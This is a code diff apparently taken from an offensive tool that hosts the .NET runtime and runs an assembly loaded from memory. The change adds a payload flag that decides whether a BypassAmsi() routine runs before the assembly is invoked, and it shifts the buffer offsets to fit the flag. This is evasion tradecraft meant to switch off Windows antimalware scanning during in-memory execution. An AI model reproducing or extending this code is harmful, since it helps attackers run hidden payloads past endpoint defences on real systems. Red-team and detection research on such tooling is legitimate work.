@@ -9,8 +9,9 @@
 #include "HostingCLR.h"
 
 #define RAW_ASSEMBLY_LENGTH 1024000
-#define RAW_AGRS_LENGTH 1024
+#define RAW_AGRS_LENGTH 1023
 
+unsigned char amsiflag[1];
 unsigned char arg_s[RAW_AGRS_LENGTH];
 unsigned char allData[RAW_ASSEMBLY_LENGTH + RAW_AGRS_LENGTH];
 unsigned char rawData[RAW_ASSEMBLY_LENGTH];
@@ -63,11 +64,16 @@ int executeSharp(LPVOID lpPayload)
 	//Reading memory parameter + assembly
 	ReadProcessMemory(GetCurrentProcess(), lpPayload, allData, RAW_ASSEMBLY_LENGTH + RAW_AGRS_LENGTH, &readed);
 
+	//Store amsi flag 
+	memcpy(amsiflag, allData, 1);
+	
+	//Taking pointer to args
+	unsigned char *offsetargs = allData + 1;
 	//Store parameters 
-	memcpy(arg_s, allData, sizeof(arg_s));
+	memcpy(arg_s, offsetargs, sizeof(arg_s));
 
 	//Taking pointer to assembly
-	unsigned char *offset = allData + RAW_AGRS_LENGTH;
+	unsigned char *offset = allData + RAW_AGRS_LENGTH + 1;
 	//Store assembly
 	memcpy(pvData, offset, RAW_ASSEMBLY_LENGTH);
 
@@ -212,7 +218,11 @@ int executeSharp(LPVOID lpPayload)
 		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 0);
 	}
 	//Amsi bypass
-	BypassAmsi();
+	if(amsiflag[0] == 0x01)
+	{
+		BypassAmsi();
+	}
+	
 	//Assembly execution
 	hr = pMethodInfo->Invoke_3(obj, psaStaticMethodArgs, &retVal);
 
